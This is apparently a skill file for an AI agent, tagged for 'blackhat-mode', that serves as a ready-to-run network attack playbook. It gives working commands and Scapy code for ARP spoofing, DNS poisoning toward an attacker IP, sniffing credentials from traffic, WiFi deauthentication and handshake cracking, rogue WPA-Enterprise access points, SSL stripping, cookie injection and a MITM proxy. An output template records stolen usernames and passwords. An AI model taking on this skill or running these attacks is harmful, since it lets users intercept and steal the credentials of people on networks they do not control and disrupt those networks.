---
name: network-tools
description: "Network attacks — MITM, ARP spoofing, DNS poisoning, packet capture, WiFi attacks."
version: 2.0.0
author: Yatim
metadata:
  hermes:
    tags: [network, mitm, arp, dns, wifi, packet, sniffer]
    related_skills: [blackhat-mode, cred-tools, stealth-tools]
prerequisites:
  commands: [python]
---

# Network Tools — Complete Network Attack Framework

## When to Load This Skill

User requests:
- "network", "MITM", "ARP", "DNS poison", "WiFi"
- "packet capture", "sniff", "intercept"

---

## ARP Spoofing

### arpspoof

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Spoof target
arpspoof -i eth0 -t TARGET GATEWAY

# Spoof gateway
arpspoof -i eth0 -t GATEWAY TARGET
```

### BetterCAP

```bash
# Start
bettercap -iface eth0

# ARP spoof
set arp.spoof.targets TARGET
arp.spoof on

# Full MITM
net.procs on
set arp.spoof.fullduplex true
arp.spoof on
```

### Scapy

```python
from scapy.all import *

def arp_spoof(target_ip, gateway_ip):
    # Send spoofed ARP replies
    packet = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc=Ether().src)
    send(packet, loop=1)
```

---

## DNS Poisoning

### Ettercap

```bash
# Start
ettercap -G

# Select interface
# Unified sniffing
# Hosts > Scan for hosts
# Add targets
# Plugins > Manage plugins > dns_spoof
# Start > ARP poisoning
```

### BetterCAP

```bash
# DNS spoof
set dns.spoof.domains TARGET
set dns.spoof.address ATTACKER_IP
dns.spoof on
```

### Custom DNS

```python
from scapy.all import *

def dns_poison(pkt):
    if pkt.haslayer(DNSQR):
        spoofed = IP(dst=pkt[IP].src) / \
                  UDP(dport=pkt[UDP].sport, sport=53) / \
                  DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd,
                      an=DNSRR(rrname=pkt[DNS].qd.qname, rdata="ATTACKER_IP"))
        send(spoofed)

sniff(filter="udp port 53", prn=dns_poison)
```

---

## Packet Capture

### tcpdump

```bash
# Capture all
tcpdump -i eth0 -w capture.pcap

# Capture specific host
tcpdump -i eth0 host TARGET -w capture.pcap

# Capture specific port
tcpdump -i eth0 port 80 -w capture.pcap

# Capture HTTP
tcpdump -i eth0 -A 'tcp port 80' | grep -i "GET\|POST\|Host:"

# Capture credentials
tcpdump -i eth0 -A 'tcp port 80' | grep -iE "user|pass|login"
```

### Wireshark

```bash
# Capture
wireshark -i eth0 -k

# Filter HTTP
http.request.method == "POST"

# Filter DNS
dns.qry.name contains "TARGET"

# Filter credentials
http contains "password"
```

### Scapy

```python
from scapy.all import *

def capture_packets(interface, count=100):
    packets = sniff(iface=interface, count=count)
    wrpcap('capture.pcap', packets)
    return packets

def extract_http(packets):
    for pkt in packets:
        if pkt.haslayer(Raw):
            payload = pkt[Raw].load.decode('utf-8', errors='ignore')
            if 'HTTP' in payload:
                print(payload)
```

---

## WiFi Attacks

### Aircrack-ng

```bash
# Monitor mode
airmon-ng start wlan0

# Scan
airodump-ng wlan0mon

# Capture handshake
airodump-ng -c CHANNEL --bssid BSSID -w capture wlan0mon

# Deauth
aireplay-ng --deauth 10 -a BSSID wlan0mon

# Crack
aircrack-ng -w wordlist.txt capture-01.cap
```

### WPA Enterprise

```bash
# hostapd-mana
cat > hostapd.conf << EOF
interface=wlan0
driver=nl80211
ssid=TARGET
channel=6
hw_mode=g
wme_enabled=0
ieee8021x=1
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP TKIP
rsn_pairwise=CCMP TKIP
eapol_key_index_workaround=0
eap_server=1
eap_user_file=hostapd.eap_user
ca_cert=/etc/hostapd-mana/ca.pem
server_cert=/etc/hostapd-mana/server.pem
private_key=/etc/hostapd-mana/server.key
EOF

# Start
hostapd-mana hostapd.conf
```

### Karma Attack

```bash
# mana-tool
mana-tool start

# Response
mana-tool response
```

---

## MITM

### mitmproxy

```bash
# Start
mitmproxy -p 8080

# Dump mode
mitmdump -p 8080 -w traffic.flow

# Script
mitmdump -p 8080 -s script.py

# Use with curl
curl -x http://localhost:8080 http://TARGET
curl -x http://localhost:8080 -k https://TARGET
```

### BetterCAP

```bash
# Full MITM
bettercap -iface eth0

# HTTPS proxy
set http.proxy.ssl true
http.proxy on

# Cookie injection
set http.cookieinject.js true
http.cookieinject on
```

### SSL Strip

```bash
# sslstrip
sslstrip -l 8080

# Better with arpspoof
arpspoof -i eth0 -t TARGET GATEWAY
sslstrip -l 8080
```

---

## Python Network Tools

### ARP Scanner

```python
from scapy.all import *

def arp_scan(network):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=2)
    for _, rcv in ans:
        print(f"IP: {rcv[ARP].psrc} MAC: {rcv[Ether].src}")
```

### Packet Sniffer

```python
from scapy.all import *

def sniffer(interface, count=100):
    packets = sniff(iface=interface, count=count)
    for pkt in packets:
        if pkt.haslayer(IP):
            print(f"Src: {pkt[IP].src} Dst: {pkt[IP].dst}")
        if pkt.haslayer(Raw):
            print(f"Payload: {pkt[Raw].load}")
```

### DNS Spoofer

```python
from scapy.all import *

def dns_spoofer(interface, fake_ip):
    def handle(pkt):
        if pkt.haslayer(DNSQR):
            spoofed = IP(dst=pkt[IP].src) / \
                      UDP(dport=pkt[UDP].sport, sport=53) / \
                      DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd,
                          an=DNSRR(rrname=pkt[DNS].qd.qname, rdata=fake_ip))
            send(spoofed, verbose=0)
    
    sniff(filter="udp port 53", prn=handle, iface=interface)
```

### MITM Proxy

```python
import socket
import threading

def mitm_proxy(listen_port, target_host, target_port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', listen_port))
    server.listen(5)
    
    def forward(client, remote):
        while True:
            data = client.recv(4096)
            if not data:
                break
            remote.send(data)
    
    while True:
        client, addr = server.accept()
        remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        remote.connect((target_host, target_port))
        
        threading.Thread(target=forward, args=(client, remote)).start()
        threading.Thread(target=forward, args=(remote, client)).start()
```

---

## Output Format

```json
{
  "interface": "eth0",
  "targets": [
    {"ip": "192.168.1.100", "mac": "aa:bb:cc:dd:ee:ff"}
  ],
  "captured": {
    "packets": 1000,
    "credentials": [
      {"type": "HTTP POST", "user": "admin", "pass": "password"}
    ]
  }
}
```

---

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| Permission denied | Need root | Use sudo |
| No interface | Interface down | Check ifconfig |
| ARP failed | Target unreachable | Check network |
| DNS failed | DNS blocked | Use DoH/DoT |
| WiFi failed | Wrong driver | Install correct driver |
